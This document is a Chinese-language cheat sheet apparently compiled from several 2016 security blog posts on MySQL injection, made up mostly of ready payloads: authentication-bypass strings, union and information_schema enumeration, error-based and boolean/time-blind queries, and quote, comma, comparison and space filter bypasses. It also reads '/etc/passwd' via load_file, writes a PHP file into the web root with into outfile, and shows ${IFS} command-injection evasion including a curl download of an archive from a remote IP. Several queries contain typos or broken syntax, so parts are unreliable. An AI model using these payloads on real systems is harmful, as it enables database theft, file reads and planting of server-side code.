sql注入必备知识
发表于 2016-06-28
mysql常用注释
http://blog.spoock.com/2016/06/28/sql-injection-1/ 
#
--[空格]或者是--+
/*…*/
在注意过程中，这些注释可能都需要进行urlencode
mysql认证绕过

;%00
‘ or 1=1 #
‘ /*!or */ 1=1 --+
mysql连接符

mysql中使用+来进行连接。


select * from users where username='zhangsan' and "ab"="a"+"b";
mysql中常见函数

在进行sql注入过程中，会使用到mysql中的内置函数。在内置函数中，又分为获取信息的函数和功能函数。
信息函数是用来获取mysql中的数据库的信息，功能函数就是传统的函数用来完成某项操作。
常用的信息函数有：

database()，用于获取当前所使用的数据库信息
version():返回数据库的版本,等价于@@version
user()：返回当前的用户，等价如current_user参数。如：



select user();			#root@localhost
select current_user;	#root@localhost
@@datadir，获取数据库的存储位置。

1
select @@datadir;		#D:\xampp\mysql\data\
常见的功能函数有：

load_file():从计算机中载入文件,读取文件中的数据。



select * from users union select 1,load_file('/etc/passwd'),3;
select * from users union select 1,load_file(0x2F6574632F706173737764),3;  #使用16进制绕过单引号限制
into outfile：写入文件，前提是具有写入权限



select '<?php phpinfo(); ?>' into outfile '/var/www/html/xxx.php';
select char(60,63,112,104,112,32,112,104,112,105,110,102,111,40,41,59,32,63,62) into outfile '/var/www/html/xxx.php';
concat():返回结果为连接参数产生的字符串。如果其中一个参数为null，则返回值为null。用法如下：


select concat(username,password)from users;
*concat_ws():是concat_ws()的特殊形式，第一个参数是分隔符，剩下的参数就是字段名。


select concat_ws(',',username,password) from users;
group_concat():用于合并多条记录中的结果。用法如下：



select group_concat(username) from users;
#返回的就是users表中所有的用户名，并且是作为一条记录返回。
subtring(),substr():用于截断字符串。用法为:substr(str,pos,length)，注意pos是从1开始的。


select substr((select database()),1,1);
ascii():用法返回字符所对应的ascii值。


select ascii('a');		#97
length():返回字符串的长度。如：


select length("123456")		#返回6
is(exp1,exp2,exp2):如果exp1的表达式是True，则返回exp2；否则返回exp3。如：


select 1,2,if(1=1,3,-1) #1,2,3
selecrt 1,2,if(1=2,3,-1) #1,2,-1
以上就是在进行sql注入工程中常用的函数。当然还存在一些使用的不是很多的函数。

now():返回当前的系统时间
hex():返回字符串的16进制
unhex():反向的hex()的16进制
@@basedir():反向mysql的安装目录
@@versin_compile_os:操作系统
mysql数据库元信息

在mysql中存在information_schema是一个信息数据库，在这个数据库中保存了Mysql服务器所保存的所有的其他数据库的信息，如数据库名，数据库的表，表的字段名称
和访问权限。在informa_schema中常用的表有:

schemata:存储了mysql中所有的数据库信息，返回的内容与show databases的结果是一样的。
tables:存储了数据库中的表的信息。详细地描述了某个表属于哪个schema，表类型，表引擎。
show tables from secuiry的结果就是来自这个表
columns:详细地描述了某张表的所有的列以及每个列的信息。
show columns from users的结果就是来自这个表
下面就是利用以上的3个表来获取数据库的信息。


select database(); #查选数据库
select schema_name from information_schema.schemata limit 0,1  #查询数据库
select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
select column_name from information_schema.columns where table_name='users' limit 0,1;  #查询列
sql注入类型

sql注入类型大致可以分为常规的sql注入和sql盲注。sql盲注又可以分为基于时间的盲注和基于网页内容的盲注。
关于sql的盲注，网上也有很多的说明，这里也不做过多的解释。关于盲注的概念，有具体的例子就方便进行说明。
延时注入中，常用的函数就包括了if()和sleep()函数。基本的sql表达式如下：


select * from users where id=1 and if(length(user())=14,sleep(3),1);
select * from users where id=1 and if(mid(user(),1,1)='r',sleep(3),1);
宽字节注入

关于宽字节注入，可以参考宽字节注入详解。宽字节输入一般是由于网页编码与数据库的编码不匹配造成的。对于宽字节注入，使用%d5或%df绕过

mysql常用语句总结

常规注入


1' order by num #        确定字段长度
1' union select 1,2,3 #  确定字段长度
-1' union select 1,2,3 # 判断页面中显示的字段
-1' union select 1,2,group_concat(schema_name) from information_schema.schemata #显示mysql中所有的数据库
-1' union select 1,2 group_concat(table_name) from information_schema.tables where table_schame = "dbname"/database()/hex(dbname) #
-1' union select 1,2,column_name from information_schema.columns where table_name="table_name" limit 0,1 #
-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="table_name"/hex(table_name) limit 0,1 #
-1' union select 1,2,3 AND '1'='1     在注释符无法使用的情况下
双重SQL查选


select concat(0x3a,0x3a,(select database()),0x3a,0x3a);
select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a;
select concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables;
select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a; #这种sql语句的写法，常用于sql的盲注。得到数据库的信息
select count(*),concat(0x3a,0x3a,(select table_name from information_schema.table where table_schema=database() limi 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a; #得到数据库的表的信息

#利用姿势如下：
1' AND (select 1 from (select count(*),concat(0x3a,0x3a,(select table_name from information_schema.table where table_schema=database() limi 0,1),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
这种利用姿势是通过mysql执行sql命令时的报错信息来得到所需要的信息的，在接下来的文章中会对这种写法进行详细地分析。

bool盲注

1' and ascii(substr(select database(),1,1))>99
1' and ascii(substr((select table_name from information_schema.tables limit 0,1),1,1))>90
bool盲注就是根据sql语句执行返回值是True或False对应的页面内容会发生，来得到信息。

time盲注

1' AND select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null) +
1' AND select if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e',sleep(10),null) --+
上述的2种写法都是等价的，time盲注余常规的sql注入方法不同。time盲注需要一般需要使用到if()和sleep()函数。然后根据页面返回内容的长度，进而知道sleep()函数是否有执行。
根据sleep()函数是否执行来得到所需的信息。

总结

以上所有的知识点都是在sql注入中最常用到也是最基础的知识点。对于一个需要精通sql语句的web安全工程师来说，上面的知识是必须要掌握的。上面的知识也是学习sql注入最基本的知识。接下来的文章将会通过实例详细地讲解sql注入中的知识，今天的这篇文章也主要是作为一个基础知识。
http://blog.spoock.com/2016/09/04/sqli-bypass/

引号绕过

会使用到引号的地方是在于最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句。


select column_name  from information_schema.tables where table_name="users"
这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。
users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：


select column_name  from information_schema.tables where table_name=0x7573657273
总结：使用十六进制可以绕过引号

逗号绕过

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。



select substr(database(0 from 1 for 1);
select mid(database(0 from 1 for 1);
对于limit可以使用offset来绕过。


select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
总结：使用from可以绕过逗号

比较符(<,>)绕过

同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。
最常见的一个盲注的sql语句。


select * from users where id=1 and ascii(substr(database(),0,1))>64
此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值。
那么上面的这条sql语句可以使用greatest变为如下的子句:


select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
总结：使用greatest()绕过比较操作符。
http://blog.7ell.me/2016/11/01/swpu-ctf%E5%A7%BF%E5%8A%BF/            
           空格可以使用括号来绕过 

select pass from admin where user='xxxx' 和下面这个没区别
select(pass)from(admin)where(user)=('xxxx')
select User from mysql.user where User='-1'=1='0';uname的查询结果与'-1'比较---为假0
假与1比较------------------为假0
假与'0'比较----------------为真1
           mysql> select mid(user() from 1);
+--------------------+
| mid(user() from 1) |
+--------------------+
| root@localhost     |
+--------------------+
1 row in set (0.00 sec)
           空格的话Linux中可以用${IFS}来代替curl${IFS}-I baidu.com
           curl${IFS}-o${IFS}2.zip${IFS}http://xxx.xxx.xxx.xxx/2.zip

unzip${IFS}2.zip
   http://blog.spoock.com/2016/04/05/dvwa-writeup/        
命令连接符和管道：在shell中可以使用命令连接符或者是管道的方式同时在一条语句中同时运行多个命令。
| 管道符，将上一个命令的输出作为下一个命令的输入
& 连接符，使用&符号时，就可以同时运行多条命令
； Linux环境下的连接符，和&作用相同
&& 逻辑与，只有在前面的命令执行成功时，后面的命令才会执行
|| 逻辑或，前面的命令如果执行成功，后面的命令则不执行           
           
 >>> php_uname('s')
=> "Windows NT"
>>> php_uname()
=> "Windows NT PC-20140111UGXV 6.1 build 7601 (Windows 7 Ultimate Edition Servic
e Pack 1) i586"          
           
1’ 或者使用 1 or 1=1# 同样可以，那么说明就存在sql注入漏洞

 
%' and '0'='0
%' or 0=0 union select null,version() #
